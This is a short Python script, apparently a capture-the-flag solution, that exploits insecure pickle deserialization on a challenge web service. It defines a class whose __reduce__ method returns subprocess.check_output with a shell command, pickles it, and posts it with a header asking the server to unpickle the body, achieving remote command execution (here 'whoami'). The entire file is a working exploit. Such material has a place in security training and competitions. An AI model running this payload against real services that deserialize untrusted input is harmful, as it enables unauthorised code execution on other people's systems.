import pickle
import requests
import json

url = 'http://organic-sauerkraut.c.ctf-snyk.io/sayhi'

headers = {
    'accept': 'application/json',
    # 'serialilzer': 'json',
    'serialilzer': 'pickle',
    'Content-Type': 'application/json'
}

def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import subprocess
            return subprocess.check_output, (cmd,)

    payload = pickle.dumps(PickleRce())

    return payload


data = generate_payload("whoami")[2:-1]
print(data)

# res = requests.post(url, data=json.dumps(data), headers=headers)
res = requests.post(url=url, data=data, headers=headers)
print(res.text)
